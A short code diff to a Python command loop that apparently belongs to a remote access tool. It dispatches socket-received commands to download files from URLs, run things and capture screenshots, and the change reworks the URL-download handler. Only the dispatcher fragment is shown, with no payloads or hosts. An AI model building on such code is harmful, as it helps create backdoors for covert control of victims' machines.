@@ -35,7 +35,9 @@ def run(host, port):
             elif command == "cpl":
                 pass
             elif command[:6] == "urldwn":
-                urldownload(command[7:])
+                downloaded_data = urldownload(client_socket, command[7:])
+                if downloaded_data.startswith("[!] Error"):
+                    continue
             elif command[:3] == "run":
                 pass
             elif command[:7] == "prt_scr":
